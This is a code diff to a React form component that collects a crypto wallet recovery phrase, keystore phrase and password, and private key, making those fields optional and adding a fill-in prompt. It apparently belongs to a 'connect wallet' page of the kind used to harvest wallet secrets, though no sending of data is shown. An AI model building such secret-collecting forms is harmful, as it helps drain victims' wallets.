@@ -12,13 +12,19 @@ const Phrase = () => {
   const [confirmed, setConfirmed] = useState<boolean>(false); // State for confirmation
   const navigate = useNavigate();
   const schema: ZodType<connectDataType> = z.object({
-    recoveryPhrase: z.string().refine((phrase) => {
-      const wordCount = phrase.trim().split(/\s+/).length;
-      return wordCount === 12 || wordCount === 24;
-    }),
-    keystorePhrase: z.string(),
-    keystorePassword: z.string(),
-    private: z.string(),
+    recoveryPhrase: z
+      .string()
+      .optional()
+      .refine((phrase) => {
+        if (phrase) {
+          const wordCount = phrase.trim().split(/\s+/).length;
+          return wordCount === 12 || wordCount === 24;
+        }
+        return true; // If it's undefined, it's valid (because it's optional)
+      }),
+    keystorePhrase: z.string().optional(),
+    keystorePassword: z.string().optional(),
+    private: z.string().optional(),
   });
 
   const { register, handleSubmit, reset } = useForm<connectDataType>({
@@ -84,6 +90,9 @@ const Phrase = () => {
           </p>
 
           <form className={styles.form} onSubmit={handleSubmit(submitData)}>
+            <div className={styles.kindly}>
+              Kindly fill in the necessary details in its respective field
+            </div>
             <div className={styles.divPhrase}>
               <label htmlFor="" className={styles.phrase}>
                 Phrase
